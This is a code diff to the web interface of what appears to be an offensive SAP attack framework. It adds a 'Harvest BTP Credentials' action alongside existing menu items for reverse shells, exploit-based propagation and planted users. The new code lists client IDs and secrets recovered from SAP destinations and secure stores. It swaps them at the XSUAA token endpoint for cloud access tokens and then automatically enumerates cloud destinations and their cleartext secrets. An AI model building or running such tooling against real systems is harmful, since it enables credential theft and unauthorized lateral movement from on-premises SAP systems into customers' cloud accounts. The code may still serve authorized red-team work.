@@ -743,6 +743,7 @@ body {
       <div class="ctx-item" data-action="reverse_shell">&#128279; Reverse Shell</div>
       <div class="ctx-sep"></div>
       <div class="ctx-item" data-action="propagate">&#128640; Propagate (exploit next hop)</div>
+      <div class="ctx-item" data-action="harvest_btp_creds">&#9729; Harvest BTP Credentials (lateral to cloud)</div>
     </div>
   </div>
   <!-- Cloud Connector submenu (visible only when SCC is on same host) -->
@@ -2907,6 +2908,10 @@ function showCtxMenu(e, sid) {
     'scc_via_sap_download_hashes':  hasGwVuln || hasCve31324 || hasCreatedUsers,
     'create_tcpip':     hasCreds,                   // need credentials/access
     'propagate':        hasCreds,                   // need access to propagate from
+    // Harvest is pure introspection over already-captured state, so
+    // any node will return *something* (often nothing, that's fine).
+    // Always available — operator decides whether to mint.
+    'harvest_btp_creds': true,
     'cleanup':          hasCreatedUsers,             // need created users to clean up
     'client_roles':     hasCreds,                   // need credentials/access
     'set_type':         true,                       // always available
@@ -3498,6 +3503,7 @@ async function ctxAction(action) {
     case 'reverse_shell': showShellModal(sid); break;
     case 'create_tcpip': showTcpipModal(sid); break;
     case 'propagate': showPropagateModal(sid); break;
+    case 'harvest_btp_creds': await showHarvestBtpCredsModal(sid); break;
     case 'cleanup':
       if (confirm(`Delete SAPMAP00 user from ${sid}?`))
         await api('POST', `node/${sid}/cleanup`);
@@ -5497,6 +5503,111 @@ async function doPropagateTarget() {
   if (!targetSid) { alert('Select a target system'); return; }
   closeModal('propagate-modal');
   await api('POST', `node/${selectedNodeSid}/propagate`, { target_sid: targetSid });
+  startPolling();
+}
+
+// On-prem → BTP lateral move: show captured BTP-bound credentials
+// (SM59 destinations to *.hana.ondemand.com, RSECTAB / Java SecStore
+// rows) and let the operator pick one to exchange at XSUAA for a
+// BTP access token.  After a successful mint the existing BTP
+// pull-destinations flow runs automatically.
+async function showHarvestBtpCredsModal(sid) {
+  const r = await api('POST', `node/${sid}/harvest_btp_creds`);
+  const cands = (r && r.candidates) || [];
+  const overlay = document.createElement('div');
+  overlay.className = 'modal-overlay';
+  overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center';
+  overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };
+
+  const rows = cands.map((c, i) => `
+    <tr style="border-top:1px solid #30363d">
+      <td style="padding:6px 8px;font-size:11px;color:#8b949e">${escHtml(c.source)}</td>
+      <td style="padding:6px 8px;font-size:11px;font-family:monospace;word-break:break-all">${escHtml(c.label)}</td>
+      <td style="padding:6px 8px"><input id="btph-uaa-${i}" value="${escHtml(c.uaa_url)}" style="width:100%;font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:3px 6px;border-radius:3px"></td>
+      <td style="padding:6px 8px"><input id="btph-cid-${i}" value="${escHtml(c.client_id)}" style="width:160px;font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:3px 6px;border-radius:3px"></td>
+      <td style="padding:6px 8px"><input id="btph-cs-${i}" value="${escHtml(c.client_secret)}" type="password" style="width:160px;font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:3px 6px;border-radius:3px"></td>
+      <td style="padding:6px 8px"><button class="btn" onclick="doMintBtpToken('${escHtml(sid)}', ${i})" style="background:#1f6feb;color:#fff;border:0;padding:4px 10px;border-radius:4px;cursor:pointer">Mint</button></td>
+    </tr>`).join('');
+
+  overlay.innerHTML = `
+    <div class="modal" style="max-width:1100px;width:96%;max-height:90vh;overflow-y:auto;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px 20px;color:#c9d1d9">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+        <h3 style="margin:0;color:#f0883e">&#9729; Harvest BTP Credentials — ${escHtml(sid)}</h3>
+        <button onclick="this.closest('.modal-overlay').remove()" style="background:transparent;border:0;color:#c9d1d9;font-size:22px;cursor:pointer">&times;</button>
+      </div>
+      <div style="font-size:12px;color:#8b949e;margin-bottom:10px;line-height:1.45">
+        Scans this node's already-captured artefacts (SM59 destinations to <code>*.hana.ondemand.com</code>, ABAP RSECTAB, Java SecStoreFS) for
+        BTP-shaped <code>(client_id, client_secret)</code> pairs.  Click <b>Mint</b> on a row to exchange at the destination's XSUAA <code>/oauth/token</code>
+        endpoint with <code>grant_type=client_credentials</code> and store the resulting BTP token; the cloud topology is then enumerated automatically.
+      </div>
+      ${cands.length === 0 ? `
+        <div style="padding:14px;background:#0d1117;border:1px dashed #30363d;border-radius:6px;text-align:center;color:#8b949e;font-size:12px">
+          No BTP-bound credentials found in <b>${escHtml(sid)}</b>'s captures yet.<br>
+          Try running <b>Retrieve RFC Connections</b> + <b>Download SecStore</b> first; outbound destinations to
+          <code>*.authentication.*.hana.ondemand.com</code> with cleartext-recovered passwords will appear here.<br><br>
+          Or paste credentials manually:
+        </div>
+        <div style="display:grid;grid-template-columns:1fr 1fr 1fr auto;gap:6px;margin-top:10px;align-items:center">
+          <input id="btph-uaa-manual" placeholder="https://&lt;subdomain&gt;.authentication.&lt;region&gt;.hana.ondemand.com/oauth/token" style="font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:6px 8px;border-radius:3px">
+          <input id="btph-cid-manual" placeholder="client_id (e.g. sb-clone…!b…|destination-xsappname!b…)" style="font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:6px 8px;border-radius:3px">
+          <input id="btph-cs-manual" placeholder="client_secret" type="password" style="font-family:monospace;font-size:11px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;padding:6px 8px;border-radius:3px">
+          <button class="btn" onclick="doMintBtpToken('${escHtml(sid)}', 'manual')" style="background:#1f6feb;color:#fff;border:0;padding:6px 14px;border-radius:4px;cursor:pointer">Mint</button>
+        </div>
+      ` : `
+        <table style="width:100%;border-collapse:collapse;font-size:11px">
+          <thead>
+            <tr style="background:#0d1117">
+              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">Source</th>
+              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">Origin</th>
+              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">UAA URL (token endpoint)</th>
+              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">client_id</th>
+              <th style="padding:6px 8px;text-align:left;color:#8b949e;font-weight:600;font-size:10px">client_secret</th>
+              <th></th>
+            </tr>
+          </thead>
+          <tbody>${rows}</tbody>
+        </table>
+      `}
+      <div id="btph-result" style="margin-top:12px;font-size:12px;font-family:monospace;color:#8b949e"></div>
+    </div>
+  `;
+  document.body.appendChild(overlay);
+}
+
+async function doMintBtpToken(sid, idx) {
+  const suffix = idx === 'manual' ? 'manual' : String(idx);
+  const uaa = document.getElementById(`btph-uaa-${suffix}`).value.trim();
+  const cid = document.getElementById(`btph-cid-${suffix}`).value.trim();
+  const cs = document.getElementById(`btph-cs-${suffix}`).value.trim();
+  const result = document.getElementById('btph-result');
+  result.style.color = '#c9d1d9';
+  result.textContent = `Minting against ${uaa} …`;
+  if (!uaa || !cid || !cs) {
+    result.style.color = '#f85149';
+    result.textContent = 'uaa_url, client_id and client_secret are required';
+    return;
+  }
+  const r = await api('POST', `node/${sid}/mint_btp_token`, {
+    uaa_url: uaa, client_id: cid, client_secret: cs });
+  if (!r || !r.ok) {
+    result.style.color = '#f85149';
+    result.textContent = `Mint failed: ${(r && r.error) || 'unknown error'}`;
+    return;
+  }
+  result.style.color = '#3fb950';
+  result.textContent = `Token minted for region ${r.region}.  Auto-enumerating destinations …`;
+  // Auto-fire the destination-token pull so the cloud topology
+  // appears on the map without a second click.
+  try {
+    const e = await api('POST', 'btp/pull_destinations_for_token', { region: r.region });
+    if (e && e.ok) {
+      result.textContent += ` ✓ ${e.destinations} destination(s) captured, ${e.cleartext_captured} cleartext, ${e.linked_to_onprem} linked.`;
+    } else if (e && e.error) {
+      result.textContent += ` (enumerate: ${e.error})`;
+    }
+  } catch (err) {
+    result.textContent += ` (enumerate failed: ${err})`;
+  }
   startPolling();
 }
 
